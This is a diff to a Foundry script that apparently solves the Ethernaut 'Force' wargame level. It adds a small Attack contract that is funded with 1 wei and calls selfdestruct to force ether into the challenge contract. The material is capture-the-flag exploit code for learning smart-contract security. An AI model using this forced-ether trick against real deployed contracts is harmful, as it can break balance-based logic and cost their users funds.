@@ -5,6 +5,12 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+contract Attack {
+    constructor() payable {}
+    function destroy(address payable to) external {
+        selfdestruct(to);
+    }
+}
 
 contract ForceSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0xb6c2Ec883DaAac76D8922519E63f875c2ec65575;
@@ -15,9 +21,8 @@ contract ForceSolution is Script, EthernautHelper {
         // NOTE this is the address of your challenge contract
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
-        // YOUR SOLUTION HERE
-
-
+        Attack attack = new Attack{value: 1 wei}();
+        attack.destroy(payable(challengeInstance));
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
